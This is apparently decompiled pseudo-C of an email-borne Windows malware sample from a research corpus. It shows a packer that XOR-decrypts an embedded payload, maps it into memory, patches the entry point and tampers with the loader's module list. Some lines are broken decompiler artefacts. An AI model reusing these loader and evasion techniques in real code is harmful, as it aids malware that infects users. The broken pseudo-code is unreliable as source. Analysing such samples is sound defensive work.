/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_1193/ia32_pe/subject.exe'
 */

/*	Procedure: 0x00401030 - 0x00401070
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L00401030(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    for(*L004072E8 = 0; *L004072E8 < A10; *L004072E8 = eax) {
        *(A8 + *L004072E8) = *(Ac + *L004072E8);
        eax = *L004072E8 + 1;
    }
}

/*	Procedure: 0x00401071 - 0x0040107F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401071()
{



}

/*	Procedure: 0x004010BF - 0x004010BF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004010BF()
{



    asm("int3");
}

/*	Procedure: 0x004010C0 - 0x00401342
 *	Argument size: 340
 *	Local size: 328
 *	Save regs size: 12
 */

__entry_point__(A8, A158)
/* unknown */ void  A8;
/* unknown */ void  A158;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffeb8;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffffc;



    (save)0;
    Vffffffec = *__imp__GetModuleHandleA();
    (save)32512;
    (save)0;
    *__imp__LoadIconA();
    *L004072E8 = 1169;
    *L004072F0 = A8;
    *L00407300 = !(eax = *L004072F0 & 65535) ? 0 : 1;
    if(*L004072F0 == 0) {
        *L00407300 = 0;
    }
    if(*L00407300 != 0) {
        Vffffffec = *L004072F0;
    }
    (save)230;
    (save) & Vfffffeb8;
    *__imp__GetWindowsDirectoryA();
    (save)"\system32\debug.exe";
    (save) & Vfffffeb8;
    *__imp__lstrcatA();
    (save)0;
    (save)128;
    (save)3;
    (save)0;
    (save)3;
    (save)128;
    (save) & Vfffffeb8;
    Vfffffff4 = *__imp__CreateFileA();
    if(Vfffffff4 == -1) {
        eax = 0;
    } else {
        (save)"2354bb0aabb0ba0b0a0a0argsdg";
        (save) & Vfffffeb8;
        *__imp__lstrcatA();
        (save)0;
        (save)128;
        (save)3;
        (save)0;
        (save)3;
        (save)128;
        (save) & Vfffffeb8;
        Vfffffff4 = *__imp__CreateFileA();
        if(Vfffffff4 != -1) {
            eax = 0;
        } else {
            *L004072E8 = 546;
            Vffffffe8 = 0x402001;
            *L004072E8 = 6846;
            for(Vfffffffc = 0; Vfffffffc < 20992; Vfffffffc = Vfffffffc + 8) {
                (save)0;
                *__imp__GetModuleHandleA();
                *(Vffffffe8 + Vfffffffc) = *(Vffffffe8 + Vfffffffc) + Vfffffffc;
                *(Vffffffe8 + Vfffffffc) = Vfffffffc + 45566668 ^ *(Vffffffe8 + Vfffffffc);
            }
            *L004072FC = L004019B0(20992);
            L00401030( *L004072FC, Vffffffe8, 20992);
            *L004072EC = edi;
            *L004072E4 = esi;
            *L004072F8 = ebx;
            ecx = -1;
            *L00407308 = *%fs:ecx+0x19];
            *L004072F4 = ebp;
            (save)"kernel32.dll";
            *L00407304 = *__imp__GetModuleHandleA();
            for(Vfffffffc = 0; Vfffffffc < 7; Vfffffffc = Vfffffffc + 1) {
                edx = Vfffffffc;
                19 = edx * edx;
                eax = L00401350( *L00407304, edx + "UnmapViewOfFile");
                *(Vfffffffc * 4 + 0x407320) = eax;
            }
            ecx = 1;
            Vfffffffc = 0x4012fb;
            L004019E0(Vfffffffc - Vffffffec, Vffffffec);
            L004013A0( *L004072FC);
            esi = *L004072E4;
            ebx = *L004072F8;
            edi = *L004072EC;
            esp = *L004072F4;
            esp = esp + 4;
            if(*L00407300 != 0) {
                A158 = *L004072FC;
            }
            goto ( *L0040733c);
            eax = 0;
        }
    }
}

/*	Procedure: 0x00401343 - 0x0040134F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401343()
{



}

/*	Procedure: 0x00401350 - 0x0040136B
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L00401350(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    *(ebp - 4) = *__imp__GetProcAddress(A8, Ac, ecx);
    return(*(ebp - 4));
}

/*	Procedure: 0x0040136C - 0x0040136F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040136C()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x00401370 - 0x0040139B
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00401370(A8)
/* unknown */ void  A8;
{



    *L004072E8 = 1;
    *(ebp - 4) = A8 + *L004072E8 * 8 + 120;
    *__imp__GetCommandLineA(ecx);
    return(*( *(ebp - 4)));
}

/*	Procedure: 0x0040139C - 0x0040139F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040139C()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x004013A0 - 0x00401928
 *	Argument size: 4
 *	Local size: 192
 *	Save regs size: 4
 */

L004013A0(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  esi;
	/* unknown */ void  Vffffff40;
	/* unknown */ void  Vffffff44;
	/* unknown */ void  Vffffff48;
	/* unknown */ void  Vffffff4c;
	/* unknown */ void  Vffffff50;
	/* unknown */ void  Vffffff54;
	/* unknown */ void  Vffffffc8;
	/* unknown */ void  Vffffffcc;
	/* unknown */ void  Vffffffd0;
	/* unknown */ void  Vffffffd4;
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    if(*L00407300 != 0) {
        Vffffff50 = *L004072F0;
        Vfffffffc = *(Vffffff50 + *(Vffffff50 + 60) + 80);
    }
    Vffffff50 = A8;
    Vffffffcc = A8 + *(Vffffff50 + 60);
    Vffffffdc = Vffffffcc + ( *(Vffffffcc + 20) & 65535) + 24;
    (save)64;
    (save)12288;
    (save) *(Vffffffcc + 80);
    (save)0;
    Vffffffd4 = *L0040732c();
    edx = *(Vffffffcc + 6) & 65535;
    40 = edx * edx;
    L00401030(Vffffffd4, A8, *(Vffffff50 + 60) + edx + 312);
    for(Vfffffff0 = 0; Vfffffff0 < ( *(Vffffffcc + 6) & 65535); Vfffffff0 = Vfffffff0 + 1) {
        if(*(Vffffffdc + 20) != 0 && *(Vffffffdc + 16) != 0) {
            eax = *(Vffffffdc + 16) + *(Vffffffcc + 60) - 1;
            ecx = Vffffffcc;
            edx = 0;
            *(ecx + 60) = *(ecx + 60) / *(ecx + 60);
            edx = *(ecx + 60) % *(ecx + 60);
            *(Vffffffcc + 60) = *(Vffffffcc + 60) * eax;
            L00401030(Vffffffd4 + *(Vffffffdc + 12), A8 + *(Vffffffdc + 20), eax);
        }
        Vffffffdc = Vffffffdc + 40;
    }
    Vffffff50 = Vffffffd4;
    Vffffffcc = Vffffff50 + *(Vffffff50 + 60);
    Vffffff4c = L00401370(Vffffffcc) + Vffffffd4;
    if(*L00407300 == 0) {
        (save)0;
        (save) *(Vffffffcc + 80);
        (save)0;
        (save)4;
        (save)0;
        (save)-1;
        Vfffffff4 = *L00407324();
    } else {
        Vfffffff4 = 0;
    }
    while(*(Vffffff4c + 16) != 0) {
        (save)Vffffffd4 + *(Vffffff4c + 12);
        Vffffffe8 = *L00407338();
        *__imp__GetCommandLineA();
        if(*Vffffff4c == 0) {
            Vffffffe0 = Vffffffd4 + *(Vffffff4c + 16);
            *__imp__GetCommandLineA();
            Vffffffd0 = Vffffffd4 + *Vffffff4c;
        } else {
            Vffffffe0 = Vffffffd4 + *Vffffff4c;
            *__imp__GetCommandLineA();
            Vffffffd0 = Vffffffd4 + *(Vffffff4c + 16);
        }
        Vffffffec = 0;
        if(*(Vffffff4c + 16) != 0 && *Vffffff4c != 0) {
            Vffffffec = 1;
        }
        while(*Vffffffe0 != 0) {
            *Vffffffe0 = eax = *Vffffffe0 & -2147483648 ? L00401350(Vffffffe8, *Vffffffe0 + Vffffffd4 + 2) : L00401350(Vffffffe8, *Vffffffe0 & 2147483647);
            if(Vffffffec != 0) {
                *Vffffffd0 = *Vffffffe0;
            }
            Vffffffe0 = Vffffffe0 + 4;
            *__imp__GetCommandLineA();
            Vffffffd0 = Vffffffd0 + 4;
        }
        *__imp__GetCommandLineA();
        Vffffff4c = Vffffff4c + 20;
    }
    if(*L00407300 == 0) {
        (save) *(Vffffffcc + 52);
        (save)0;
        (save)0;
        (save)0;
        (save)34;
        (save)Vfffffff4;
        *L004072E0 = *L00407334();
    } else {
        *L004072E0 = 0;
    }
    if(*L004072E0 == 0) {
        Vffffff48 = 1;
        Vfffffff8 = *L00407300 != 0 ? *L004072F0 : *(Vffffffcc + 52);
        (save)Vfffffff8;
        if(*L00407320() == 0) {
            (save)32768;
            (save)0;
            (save)Vfffffff8;
            if(*L00407330() != 0) {
                goto L004016de;
            }
            eax = 0;
            goto L00401922;
        }
L004016de:
        if(*L00407300 == 0) {
            (save) *(Vffffffcc + 52);
            (save)0;
            (save)0;
            (save)0;
            (save)34;
            (save)Vfffffff4;
            *L004072E0 = *L00407334();
            if(*L004072E0 == 0) {
                (save)64;
                (save)12288;
                (save) *(Vffffffcc + 80);
                (save) *(Vffffffcc + 52);
                *L004072E0 = *L0040732c();
            }
        } else {
            (save)64;
            (save)12288;
            (save)Vfffffffc;
            (save)Vfffffff8;
            *L0040732c();
        }
    }
    if(*L00407300 == 0) {
        L00401030( *L004072E0, Vffffffd4, *(Vffffffcc + 80));
        (save)Vfffffff4;
        *L00407328();
        L00401B30( *L004072E0);
        *L0040733C = *L004072E0 + *(Vffffffcc + 40);
        *(Vffffffcc + 40) = *L0040733C;
    } else {
        *L004072E0 = Vffffffd4;
        Vffffffc8 = Vffffffd4 - *(Vffffffcc + 52);
        if(*(Vffffffcc + 164) != 0) {
            for(Vffffffe4 = Vffffff50 + *(Vffffffcc + 160); *(Vffffffe4 + 4) != 0; Vffffffe4 = Vffffffe4 + *(Vffffffe4 + 4)) {
                Vffffffd8 = *(Vffffffe4 + 4) - 8 >> 1;
                Vffffff54 = Vffffffe4 + 8;
                for(Vfffffff0 = 0; Vfffffff0 < Vffffffd8; Vfffffff0 = Vfffffff0 + 1) {
                    if(( *(Vffffff54 + Vfffffff0 * 2) & 65535) >> 12 == 3) {
                        *(Vffffffd4 + *Vffffffe4 + ( *(Vffffff54 + Vfffffff0 * 2) & 65535 & 4095)) = *(Vffffffd4 + *Vffffffe4 + ( *(Vffffff54 + Vfffffff0 * 2) & 65535 & 4095)) + Vffffffc8;
                    }
                }
            }
        }
        *L0040733C = *L004072E0 + *(Vffffffcc + 40);
        Vffffff40 = Vfffffff8 + *(Vffffffcc + 40);
        Vffffff50 = *L004072F0;
        *(Vffffffcc + 22) = *(Vffffffcc + 22) & 65535 | 8192;
        (save) & Vffffff44;
        (save)64;
        (save)6;
        (save)Vffffff40;
        *__imp__VirtualProtect();
        eax = Vffffff40;
        *eax = 104;
        *(eax + 1) = *L0040733C;
        *(eax + 5) = 195;
        *L004072FC = *L004072E0;
        L00401930( *L004072F0, *L004072E0 + *(Vffffffcc + 40), *L004072E0);
    }
    eax = 1;
L00401922:
}

/*	Procedure: 0x00401929 - 0x0040192F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401929()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x00401930 - 0x004019A8
 *	Argument size: 0
 *	Local size: 12
 *	Save regs size: 0
 */

L00401930(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    ecx = *L00407308;
    ecx = *%ds:ecx+0x30];
    Vfffffff4 = *%ds:ecx+0xc];
    Vfffffff8 = *(Vfffffff4 + 12);
    Vfffffffc = Vfffffff8;
    while(1) {
        if(1 == 0) {
            goto L004019a3;
        }
        if(Vfffffff8 == 0) {
            break;
        }
        if(*(Vfffffff8 + 24) == A8) {
            goto L0040197a;
        }
        Vfffffff8 = *Vfffffff8;
        if(Vfffffff8 == Vfffffffc) {
            goto L0040199d;
        }
    }
    eax = 0;
    goto L004019a5;
L0040197a:
    *(Vfffffff8 + 28) = Ac;
    *(Vfffffff8 + 24) = A10;
    eax = 1;
    goto L004019a5;
L0040199d:
    eax = 0;
    goto L004019a5;
L004019a3:
    eax = 0;
L004019a5:
}

/*	Procedure: 0x004019A9 - 0x004019AF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004019A9()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x004019B0 - 0x004019DD
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L004019B0(A8)
/* unknown */ void  A8;
{



    (save)ecx;
    *(ebp - 4) = 1;
    *__imp__GetCommandLineA();
    *(ebp - 4) = *__imp__HeapAlloc( *__imp__GetProcessHeap(), 0, A8);
    return(*(ebp - 4));
}

/*	Procedure: 0x004019DE - 0x004019DF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004019DE()
{



    asm("int3");
    asm("int3");
}

stack space not deallocated on return
/*	Procedure: 0x004019E0 - 0x00401B21
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004019E0()
{



    (save)ebp;
    ebp = esp;
    esp = esp - 32;
    (save)esi;
    *(ebp - 32) = *(ebp + 12);
    ecx = *(ebp - 32);
    *(ebp - 16) = *(ebp - 32) + *(ecx + 60);
    (save)64;
    (save)12288;
    (save) *( *(ebp - 16) + 80);
    (save)0;
    *L004072E0 = *L0040732c();
    if(*L004072E0 == 0) {
        eax = 2;
    } else {
        L00401030( *L004072E0, *(ebp - 32), *( *(ebp - 16) + 80));
        eax = *L004072E0 - *(ebp - 32);
        *(ebp - 24) = eax;
        if(*( *(ebp - 16) + 164) != 0) {
            edx = *(ebp - 16);
            eax = *(ebp - 32) + *(edx + 160);
            for(*(ebp - 8) = eax; *( *(ebp - 8) + 4) != 0; *(ebp - 8) = edx) {
                *(ebp - 12) = *( *(ebp - 8) + 4) - 8 >> 1;
                *(ebp - 28) = *(ebp - 8) + 8;
                for(*(ebp - 4) = 0; 1; *(ebp - 4) = *(ebp - 4) + 1) {
                    eax = *(ebp - 4);
                    if(eax >= *(ebp - 12)) {
                        break;
                    }
                    ecx = *(ebp - 4);
                    if(( *( *(ebp - 28) + ecx * 2) & 65535) >> 12 == 3) {
                        ecx = *(ebp - 8);
                        edx = *L004072E0 + *ecx;
                        eax = *(ebp - 4);
                        ecx = *(edx + ( *( *(ebp - 28) + eax * 2) & 65535 & 4095)) + *(ebp - 24);
                        edx = *(ebp - 4);
                        edx = *( *(ebp - 28) + edx * 2) & 65535 & 4095;
                        eax = *(ebp - 8);
                        *( *L004072E0 + *eax + edx) = ecx;
                    }
                }
                ecx = *(ebp - 8);
                edx = *(ebp - 8) + *(ecx + 4);
            }
        }
        edx :: 0;
        edx :: 0;
        (save) *(ebp + 8) + *L004072E0;
        edx :: 0;
        return;
    }
    (restore)esi;
    esp = ebp;
    (restore)ebp;
}

/*	Procedure: 0x00401B22 - 0x00401B2F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401B22()
{



}

/*	Procedure: 0x00401B30 - 0x00401B53
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00401B30(A8)
/* unknown */ void  A8;
{



    edx = 0;
    edx = *L00407308;
    eax = 6036;
    *%ds:eax+0x8] = A8;
    return(*%ds:edx+eax+0xffffe89c]);
}

/*	Procedure: 0x00401B54 - 0x00000000
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401B54()
{



}

/* address  size  */
/* 0x00401000       0 */ /* unknown */ void 	__imp__GetCommandLineA;
/* 0x00401004       0 */ /* unknown */ void 	__imp__CreateFileA;
/* 0x00401008       0 */ /* unknown */ void 	__imp__lstrcatA;
/* 0x0040100c       0 */ /* unknown */ void 	__imp__GetWindowsDirectoryA;
/* 0x00401010       0 */ /* unknown */ void 	__imp__GetModuleHandleA;
/* 0x00401014       0 */ /* unknown */ void 	__imp__GetProcAddress;
/* 0x00401018       0 */ /* unknown */ void 	__imp__VirtualProtect;
/* 0x0040101c       0 */ /* unknown */ void 	__imp__HeapAlloc;
/* 0x00401020       0 */ /* unknown */ void 	__imp__GetProcessHeap;
/* 0x00401028       0 */ /* unknown */ void 	__imp__LoadIconA;
/* 0x004010c0       0 */ /* unknown */ void 	__entry_point__;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
